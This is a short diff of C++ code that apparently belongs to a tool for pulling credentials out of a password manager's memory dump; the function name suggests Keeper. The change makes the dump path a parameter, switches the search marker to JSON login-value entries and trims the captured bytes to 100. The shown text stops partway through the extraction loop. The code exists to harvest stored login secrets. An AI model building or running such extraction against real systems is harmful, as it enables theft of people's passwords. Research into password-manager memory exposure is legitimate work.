@@ -4,15 +4,15 @@
 #include <vector>
 #include "../core/saveFile.h"
 
-int getCredskeeper1() {
-    std::ifstream file("app.dmp", std::ios::binary);
+int getCredskeeper1(std::string filename) {
+    std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
         std::cerr << "Error opening the file." << std::endl;
         return 1;
     }
 
-    std::string searchSequence = "{\"title\":";
+    std::string searchSequence = "{\"type\":\"login\",\"value\":";
     std::vector<char> foundData;
 
     while (!file.eof()) {
@@ -22,9 +22,9 @@ int getCredskeeper1() {
         if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
             if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 1000 binary characters
+                // We found the search sequence, now collect the next 100 binary characters
                 std::vector<char> extractedData;
-                for (int i = 0; i < 1000; i++) {
+                for (int i = 0; i < 100; i++) {
                     file.get(c);
                     if (file.eof()) {
                         break;
